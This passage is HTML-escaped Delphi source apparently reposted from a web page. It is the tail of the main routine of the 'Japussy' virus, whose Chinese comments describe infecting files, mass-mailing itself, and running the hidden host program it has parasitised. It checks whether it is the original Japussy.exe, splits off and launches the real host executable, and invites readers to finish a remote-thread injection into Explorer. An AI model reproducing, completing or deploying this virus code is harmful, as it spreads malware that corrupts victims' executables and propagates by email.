&#47;&#47;注册为服务进程<br &#47;>&nbsp; else &#47;&#47;WinNT<br &#47;>&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp; &#47;&#47;远程线程映射到Explorer进程<br &#47;>&nbsp;&nbsp;&nbsp; &#47;&#47;哪位兄台愿意完成之？<br &#47;>&nbsp; end;<br &#47;>&nbsp; &#47;&#47;如果是原始病毒体自己<br &#47;>&nbsp; if CompareText(ExtractFileName(ParamStr(0)), 'Japussy.exe') = 0 then<br &#47;>&nbsp;&nbsp;&nbsp; InfectFiles &#47;&#47;感染和发邮件<br &#47;>&nbsp; else &#47;&#47;已寄生于宿主程序上了，开始工作<br &#47;>&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp; TmpFile := ParamStr(0); &#47;&#47;创建临时文件<br &#47;>&nbsp;&nbsp;&nbsp; Delete(TmpFile, Length(TmpFile) - 4, 4);<br &#47;>&nbsp;&nbsp;&nbsp; TmpFile := TmpFile + #32 + '.exe'; &#47;&#47;真正的宿主文件，多一个空格<br &#47;>&nbsp;&nbsp;&nbsp; ExtractFile(TmpFile); &#47;&#47;分离之<br &#47;>&nbsp;&nbsp;&nbsp; FillStartupInfo(Si, SW_SHOWDEFAULT);<br &#47;>&nbsp;&nbsp;&nbsp; CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0, nil, '.', Si, Pi); &#47;&#47;创建新进程运行之<br &#47;>&nbsp;&nbsp;&nbsp; InfectFiles; &#47;&#47;感染和发邮件<br &#47;>&nbsp; end;<br &#47;>end. <br &#47;><&#47;div></p>
